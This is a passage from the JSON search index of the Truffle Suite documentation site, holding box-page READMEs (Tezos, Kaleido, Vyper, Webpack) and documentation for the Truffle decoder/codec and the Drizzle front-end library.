[here](http://skale.chat).\\n'","title":"Index"},{"location":"boxes/skaledapp/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS skaledapp CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/svelte-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS svelte-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/tezos-example/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS tezos-example-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'Tezos Example Box\\n=================\\n\\n**Note: Experimental. Currently designed for demo purposes only.**\\n\\nThis box contains a `Counter` and `SimpleStorage` contract to display the basics of Tezos LIGO integration with Truffle.\\n\\n\\n## Prerequisites\\n\\n- [Docker](https://docs.docker.com/v17.12/install/)\\n - Used for LIGO compilations and running a local sandbox Tezos node.\\n- [NodeJS](https://nodejs.org/en/)\\n - v8.9.4 to v12.2.0\\n\\n\\n## Installation\\n\\n1. Install Truffle globally. Make sure you install `truffle@tezos`.\\n ```shell\\n npm install -g truffle@tezos\\n ```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n ```shell\\n truffle unbox tezos-example\\n ```\\n\\n\\n## Usage\\n\\n- Compiling the example smart contracts\\n\\n ```shell\\n truffle compile\\n ```\\n\\n- Starting the local `ganache-cli` sandbox Tezos node\\n ```shell\\n npm run start-sandbox\\n ```\\n\\n- Migrating contracts\\n ```shell\\n truffle migrate\\n ```\\n\\n- Running contract tests\\n ```shell\\n truffle test\\n ```\\n\\n\\n## Sandbox Management\\n\\nAn archive mode `ganache-cli` sandbox Tezos node is provided in this box with RPC exposed at port `8732` and ten accounts generously funded with 100 XTZ. For currently supported configurable options, see the `ganache-cli` [documentation](https://github.com/trufflesuite/ganache-cli/tree/tezos#options).\\n\\n\\n#### Commands\\n\\n```shell\\nnpm run start-sandbox\\n```\\n\\n\\n## Interacting with Live Networks\\n\\n- A test faucet key can be obtained from https://faucet.tzalpha.net/. Once saved, it can be imported inside `truffle-config.js`:\\n\\n ```javascript\\n\\n const { mnemonic, secret, password, email } = require(\"./faucet.json\");\\n\\n module.exports = {\\n networks: {\\n carthagenet: {\\n host: \"https://carthagenet.smartpy.io\",\\n port: 443,\\n network_id: \"*\",\\n secret,\\n mnemonic,\\n password,\\n email,\\n type: \"tezos\"\\n }\\n }\\n };\\n\\n ```\\n\\n- `truffle@tezos` also supports importing an activated account\\'s secret key:\\n\\n ```javascript\\n\\n module.exports = {\\n networks: {\\n carthagenet: {\\n host: \"https://carthagenet.smartpy.io\",\\n port: 443,\\n network_id: \"*\",\\n secretKey: \"edsk...\", // private key\\n type: \"tezos\"\\n }\\n }\\n };\\n ```\\n\\n ```shell\\n truffle migrate --network carthagenet\\n truffle test --network carthagenet\\n ```\\n'","title":"Index"},{"location":"boxes/thunder-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS thunder-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/tomochain-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS tomochain-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-ci-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-ci-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-create-react-app/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-create-react-app CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-kaleido-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-kaleido-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'![Truffle & Kaleido](https://github.com/kaleido-io/truffle-kaleido-box/blob/master/box-img-sm.png \"Truffle & Kaleido\")\\n\\n# Truffle & Kaleido Truffle Box\\n\\nThis box gives you a boilerplate to get up and running quickly with Truffle on a Kaleido chain.\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command with `npx` and skip to step 3. This will install all necessary dependencies.\\n\\n```\\nnpx truffle unbox kaleido-io/truffle-kaleido-box\\n```\\n\\n2. Alternatively, you can install Truffle globally and then run the `unbox` command.\\n\\n```\\nnpm install -g truffle\\ntruffle unbox kaleido-io/truffle-kaleido-box\\n```\\n\\n3. Run the development console. This will instantiate a local chain for you to test that Truffle is working properly.\\n\\n```\\ntruffle develop\\n```\\n\\n4. Ensure that you\\'re able to both compile, test, and finally migrate your contracts to your local chain.\\n\\n```\\ncompile\\ntest\\nmigrate\\n```\\n\\n5. If everything looks good, you can exit the Truffle console with `.exit`.\\n\\n## Connect to Kaleido\\n\\n1. In Kaleido, select the node you want to connect to, then choose `+ Connect Node`.\\n\\n2. Select `Native JSON/RPC`\\n\\n3. Choose an application credential to use for this connection.\\n\\n4. Choose the `Truffle Suite` connection type.\\n\\n5. Copy the connection info from this panel into the respective variables inside of `truffle-config.js`. If you are using Quorum in this environment, ensure to uncomment the `type: \"quorum\"` property on your network object.\\n\\n```\\nconst appCred = \\'yourappcred\\';\\nconst connectionURL = \\'nodeConnectionURL\\';\\n```\\n```\\ntype: \\'quorum\\' // Use this property for Quorum environments\\n```\\n\\n6. Migrate your contracts to your Kaleido chain!\\n\\n```\\ntruffle migrate\\n```\\n'","title":"Index"},{"location":"boxes/truffle-next/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-next CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-react-dapp/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-react-dapp CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-react-redux/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-react-redux CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-react-ts-template/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-react-ts-template CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-security/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-security CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-shavings/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-shavings CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-starter/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-starter CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-ts-percel-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-ts-percel-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/truffle-vue/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS truffle-vue CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/tutorialtoken/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS tutorialtoken-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# TutorialToken Truffle Box\\n\\nThis box has all you need to get started with our [Open Zeppelin (TutorialToken) tutorial](http://truffleframework.com/tutorials/robust-smart-contracts-with-openzeppelin).\\n\\n## Installation\\n\\n1. Install Truffle globally.\\n ```javascript\\n npm install -g truffle\\n ```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n ```javascript\\n truffle unbox tutorialtoken\\n ```\\n\\n3. Run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n\\n5. Run the `liteserver` development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n // Serves the front-end on http://localhost:3000\\n npm run dev\\n ```\\n\\n**NOTE**: This box is not a complete dapp, but the starting point for the [Open Zeppelin (TutorialToken) tutorial](http://truffleframework.com/tutorials/robust-smart-contracts-with-openzeppelin). You'll need to complete that for this to function.\\n\\n## FAQ\\n\\n* __How do I use this with the EthereumJS TestRPC?__\\n\\n It's as easy as modifying the config file! [Check out our documentation on adding network configurations](http://truffleframework.com/docs/advanced/configuration#networks). Depending on the port you're using, you'll also need to update line 16 of `src/js/app.js`.\\n\"","title":"Index"},{"location":"boxes/upgradable-proxy-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS upgradable-proxy-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/vue-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS vue-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/vue-dark-chocolate/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS vue-dark-chocolate CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/vueport-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS vueport-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/vyper-example/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS vyper-example-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Vyper Example Box\\n=================\\n\\nThis box contains a simple `VyperStorage` contract to show the basics of using\\nVyper with Truffle.\\n\\n## Installation\\n\\n1. Install Truffle globally. Make sure you have v5.0.0 or higher.\\n ```\\n npm install -g truffle\\n ```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n ```\\n truffle unbox vyper-example\\n ```\\n\\n3. Run the development console.\\n ```\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```\\n compile\\n migrate\\n ```\\n\\n5. Run the tests.\\n ```\\n // If inside the development console.\\n test\\n\\n // If outside the development console..\\n truffle test\\n ```\\n\"","title":"Index"},{"location":"boxes/wallette/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS wallette CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/webpack/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS webpack-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Webpack Truffle Box\\n\\nThis box is our most bare official implementation with Webpack.\\n\\nIncludes contracts, migrations, tests, user interface, and webpack build pipeline.\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command via `npx` and skip to step 3.\\n ```js\\n npx truffle unbox webpack\\n ```\\n\\n2. Alternatively, you can install Truffle globally and run the `unbox` command.\\n ```javascript\\n npm install -g truffle\\n truffle unbox webpack\\n ```\\n\\n3. Run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n\\n5. In the `app` directory, we build and run our frontend. Smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n // in another terminal (i.e. not in the truffle develop prompt)\\n cd app\\n npm run dev\\n ```\\n\\n6. Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console.\\n ```javascript\\n // inside the development console.\\n test\\n\\n // outside the development console..\\n truffle test\\n ```\\n\\n7. To build the application for production, use the build script in the `app` folder. A production build will be in the `app/dist` folder.\\n ```javascript\\n // ensure you are inside the client directory when running this\\n npm run build\\n ```\\n\\n## FAQ\\n\\n* __Where is my production build?__\\n\\n The production build will be in the `app/dist` folder after running `npm run build` in the `app` folder.\\n\\n* __Where can I find more documentation?__\\n\\n This box is a marriage of [Truffle](http://truffleframework.com/) and a [Webpack](https://webpack.js.org/) setup. Either one would be a great place to start!\"","title":"Index"},{"location":"case-studies/case-study-dish-network.html","text":"","title":"Truffle Suite"},{"location":"case-studies/case-study-microsoft-and-the-world-bank.html","text":"","title":"Truffle Suite"},{"location":"case-studies/case-study-microsoft-xbox.html","text":"","title":"Truffle Suite"},{"location":"case-studies/case-study-starbucks.html","text":"","title":"Truffle Suite"},{"location":"community/index.html","text":"","title":"Truffle Suite"},{"location":"dashboard/index.html","text":"","title":"Truffle Suite"},{"location":"docs/index.html","text":"","title":"Home"},{"location":"docs/codec/index.html","text":"Truffle Decoding and Encoding \u00b6 This documentation provides information and complete interface listings for two packages: @truffle/decoder , a high-level library for decoding, and @truffle/codec , a low-level package for encoding, decoding, and data representation. Contents \u00b6 High-level interface (for common use) \u00b6 [[@truffle/decoder]] provides a high-level interface for decoding transactions, events, and state variables for Ethereum smart contracts. This package accepts Truffle's contract abstractions as input (or Truffle's artifact files and a provider) and connects to the blockchain to retrieve raw values for decoding. Low-level interface (for special-case purposes) \u00b6 [[@truffle/codec]] provides the underlying low-level interfaces for performing this decoding, as well as interfaces for encoding these values and for decoding of local Solidity variables and other data observable in a debugging trace. This library is meant to be self-contained , makes no network connections of its own, and seeks to restrict its dependencies to those which provide data structures for high-precision numbers and other special-purpose data utilities. Although most use cases will not require invoking the codec directly, a few key parts of this library are directly relevant to decoder use. See notes below. \u2139\ufe0f Important notes \u00b6 Output format \u00b6 Both the decoder and the codec return results as objects containing both type information and either high-precision values or accurate errors in place of values. We recommend familiarizing yourself with the [[Format]] documentation in order to use these packages. Decoding modes \u00b6 The decoder operates in either of two modes: 1. Full mode ( \"decodingMode\": \"full\" ), which uses source code information to return types and values to match the original Solidity. 2. ABI mode ( \"decodingMode\": \"abi\" ), which uses only information from the contract ABI and returns less information, e.g. returning [[Format.Values.UintResult| UintResult ]]s in place of [[Format.Values.EnumResult| EnumResult ]]s and [[Format.Values.AddressResult| AddressResult ]]s istead of [[Format.Values.ContractResult| ContractResult ]]s By default, the decoder uses full mode , but for technical reasons, this may not be reliable. If decoding fails in full mode, it falls back to ABI mode. Returned decodings (i.e. [[CalldataDecoding]] and [[LogDecoding]]) indicate which mode was used via the \"decodingMode\" field. To ensure full mode works: * Use Solidity v0.4.12 or higher; * Ensure all contracts in your projects have distinct names; * Compile all your contracts at the same time; * Ensure all custom data types are declared in a file with at least one contract. (Our apologies for these technical limitations, but we are working to address these last three problems.) If you can't use full mode or don't want to deal with the distinction, the decoder provides [[WireDecoder.abifyCalldataDecoding| decoder.abifyCalldataDecoding ]] and [[WireDecoder.abifyLogDecoding| decoder.abifyLogDecoding ]] methods, which accept decodings in either mode and always return ABI mode. Additional notes on decoding modes \u00b6 Full mode may reject certain decodings (e.g. out of range enums) that are fine in ABI mode. ABI-fied full mode decodings may contain extra information that regular ABI mode results do not. Decoding mode applies to the entire decoding, but objects that contain multiple decodings (e.g. [[DecodedLog]]) may contain decodings in different modes. You can only decode state variables in full mode. If full mode fails while decoding a state variable, it will throw an exception. If a contract Base declares an event Event and a contract Derived inheriting from Base overrides Event , if Derived then emits Base.Event , ABI mode may not be able to decode it. Additional notes on decoding state variables \u00b6 While internal function pointers can only be decoded in full mode, full mode still may not be able to determine all the information about them. Thus, for internal function pointers, you may get a bare-bones decoding, or you may get a decoding with more information. Solidity 0.6.5 contains a bug that may cause some state variables to decode incorrectly if there is an immutable state variable which is written to but never read from. In any version of Solidity, it is impossible to decode an immutable state variable which is written to but never read from; these will decode to an error. Not all constant state variables can presently be decoded; some of these may simply decode to an error. \u26a1","title":"Truffle Decoding and Encoding"},{"location":"docs/codec/index.html#truffle-decoding-and-encoding","text":"This documentation provides information and complete interface listings for two packages: @truffle/decoder , a high-level library for decoding, and @truffle/codec , a low-level package for encoding, decoding, and data representation.","title":"Truffle Decoding and Encoding"},{"location":"docs/codec/index.html#contents","text":"","title":"Contents"},{"location":"docs/codec/index.html#high-level-interface-for-common-use","text":"[[@truffle/decoder]] provides a high-level interface for decoding transactions, events, and state variables for Ethereum smart contracts. This package accepts Truffle's contract abstractions as input (or Truffle's artifact files and a provider) and connects to the blockchain to retrieve raw values for decoding.","title":"High-level interface (for common use)"},{"location":"docs/codec/index.html#low-level-interface-for-special-case-purposes","text":"[[@truffle/codec]] provides the underlying low-level interfaces for performing this decoding, as well as interfaces for encoding these values and for decoding of local Solidity variables and other data observable in a debugging trace. This library is meant to be self-contained , makes no network connections of its own, and seeks to restrict its dependencies to those which provide data structures for high-precision numbers and other special-purpose data utilities. Although most use cases will not require invoking the codec directly, a few key parts of this library are directly relevant to decoder use. See notes below.","title":"Low-level interface (for special-case purposes)"},{"location":"docs/codec/index.html#i-important-notes","text":"","title":"\u2139\ufe0f Important notes"},{"location":"docs/codec/index.html#output-format","text":"Both the decoder and the codec return results as objects containing both type information and either high-precision values or accurate errors in place of values. We recommend familiarizing yourself with the [[Format]] documentation in order to use these packages.","title":"Output format"},{"location":"docs/codec/index.html#decoding-modes","text":"The decoder operates in either of two modes: 1. Full mode ( \"decodingMode\": \"full\" ), which uses source code information to return types and values to match the original Solidity. 2. ABI mode ( \"decodingMode\": \"abi\" ), which uses only information from the contract ABI and returns less information, e.g. returning [[Format.Values.UintResult| UintResult ]]s in place of [[Format.Values.EnumResult| EnumResult ]]s and [[Format.Values.AddressResult| AddressResult ]]s istead of [[Format.Values.ContractResult| ContractResult ]]s By default, the decoder uses full mode , but for technical reasons, this may not be reliable. If decoding fails in full mode, it falls back to ABI mode. Returned decodings (i.e. [[CalldataDecoding]] and [[LogDecoding]]) indicate which mode was used via the \"decodingMode\" field. To ensure full mode works: * Use Solidity v0.4.12 or higher; * Ensure all contracts in your projects have distinct names; * Compile all your contracts at the same time; * Ensure all custom data types are declared in a file with at least one contract. (Our apologies for these technical limitations, but we are working to address these last three problems.) If you can't use full mode or don't want to deal with the distinction, the decoder provides [[WireDecoder.abifyCalldataDecoding| decoder.abifyCalldataDecoding ]] and [[WireDecoder.abifyLogDecoding| decoder.abifyLogDecoding ]] methods, which accept decodings in either mode and always return ABI mode.","title":"Decoding modes"},{"location":"docs/codec/index.html#additional-notes-on-decoding-modes","text":"Full mode may reject certain decodings (e.g. out of range enums) that are fine in ABI mode. ABI-fied full mode decodings may contain extra information that regular ABI mode results do not. Decoding mode applies to the entire decoding, but objects that contain multiple decodings (e.g. [[DecodedLog]]) may contain decodings in different modes. You can only decode state variables in full mode. If full mode fails while decoding a state variable, it will throw an exception. If a contract Base declares an event Event and a contract Derived inheriting from Base overrides Event , if Derived then emits Base.Event , ABI mode may not be able to decode it.","title":"Additional notes on decoding modes"},{"location":"docs/codec/index.html#additional-notes-on-decoding-state-variables","text":"While internal function pointers can only be decoded in full mode, full mode still may not be able to determine all the information about them. Thus, for internal function pointers, you may get a bare-bones decoding, or you may get a decoding with more information. Solidity 0.6.5 contains a bug that may cause some state variables to decode incorrectly if there is an immutable state variable which is written to but never read from. In any version of Solidity, it is impossible to decode an immutable state variable which is written to but never read from; these will decode to an error. Not all constant state variables can presently be decoded; some of these may simply decode to an error. \u26a1","title":"Additional notes on decoding state variables"},{"location":"docs/drizzle/index.html","text":"Star Fork Drizzle Overview \u00b6 Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core of Drizzle is based on a Redux store, so you have access to the spectacular development tools around Redux. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. * Fully reactive contract data, including state, events and transactions. * Declarative, so you're not wasting valuable cycles on unneeded data. * Maintains access to underlying functionality. Web3 and your contract's methods are still there, untouched.","title":"Drizzle | Overview"},{"location":"docs/drizzle/index.html#drizzle-overview","text":"Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core of Drizzle is based on a Redux store, so you have access to the spectacular development tools around Redux. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. * Fully reactive contract data, including state, events and transactions. * Declarative, so you're not wasting valuable cycles on unneeded data. * Maintains access to underlying functionality. Web3 and your contract's methods are still there, untouched.","title":"Drizzle Overview"},{"location":"docs/drizzle/quickstart.html","text":"Drizzle Quickstart \u00b6 Installation \u00b6 Install Drizzle via npm: npm install --save @drizzle/store Using React? : The easiest way to get started with Drizzle is to use our official @drizzle/react-plugin package and (optionally) its companion @drizzle/react-components . Initialization \u00b6 Note : Since Drizzle uses web3 1.0 and web sockets, be sure your development environment can support these. As a development blockchain, you'll need ganache-cli v6.1.0+, geth or parity . Import the provider. import { Drizzle } from '@drizzle/store' Create an options object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const options = { contracts : [ SimpleStorage ] } const drizzle = new Drizzle ( options ) Note : The above assumes you have no existing redux store and generates a new one. To use your existing redux store, see Using an Existing Redux Store .","title":"Drizzle | Drizzle Quickstart"},{"location":"docs/drizzle/quickstart.html#drizzle-quickstart","text":"","title":"Drizzle Quickstart"},{"location":"docs/drizzle/quickstart.html#installation","text":"Install Drizzle via npm: npm install --save @drizzle/store Using React? : The easiest way to get started with Drizzle is to use our official @drizzle/react-plugin package and (optionally) its companion @drizzle/react-components .","title":"Installation"},{"location":"docs/drizzle/quickstart.html#initialization","text":"Note : Since Drizzle uses web3 1.0 and web sockets, be sure your development environment can support these. As a development blockchain, you'll need ganache-cli v6.1.0+, geth or parity . Import the provider. import { Drizzle } from '@drizzle/store' Create an options object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const options = { contracts : [ SimpleStorage ] } const drizzle = new Drizzle ( options ) Note : The above assumes you have no existing redux store and generates a new one. To use your existing redux store, see Using an Existing Redux Store .","title":"Initialization"},{"location":"docs/drizzle/getting-started/contract-interaction.html","text":"Contract Interaction \u00b6 Drizzle provides helpful methods on top of the default web3.Contract methods to keep your calls and transactions in sync with the store. cacheCall() \u00b6 Gets contract data. Calling the cacheCall() function on a contract will execute the desired call and return a corresponding key so the data can be retrieved from the store. When a new block is received, Drizzle will refresh the store automatically if any transactions in the block touched our contract. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this call to be cached and synchronized. We'll receive the store key for recall. const dataKey = drizzle . contracts . SimpleStorage . methods . storedData . cacheCall () // Use the dataKey to display data from the store. return state . contracts . SimpleStorage . storedData [ dataKey ]. value } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' The contract instance has all of its standard web3 properties and methods. For example, you could still call as normal if you don't want something in the store: drizzle . contracts . SimpleStorage . methods . storedData (). call () cacheSend() \u00b6 Sends a contract transaction. Calling the cacheSend() function on a contract will send the desired transaction and return a corresponding transaction hash so the status can be retrieved from the store. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. Drizzle will update the transaction's state in the store (pending, success, error) and store the transaction receipt. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this transaction to be observed. We'll receive the stackId for reference. const stackId = drizzle . contracts . SimpleStorage . methods . set . cacheSend ( 2 , { from : '0x3f...' }) // Use the stackId to display the transaction status. if ( state . transactionStack [ stackId ]) { const txHash = state . transactionStack [ stackId ] return state . transactions [ txHash ]. status } } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' For more information on what's contained in transaction state, see Drizzle State . The contract instance has all of its standard web3 properties and methods. For example, you could still send as normal if you don't want a tx in the store: drizzle . contracts . SimpleStorage . methods . set ( 2 ). send ({ from : '0x3f...' }) Adding Contracts Dynamically \u00b6 You can programmatically add contracts to Drizzle using either drizzle.addContract() or the ADD_CONTRACT action. var contractConfig = { contractName : 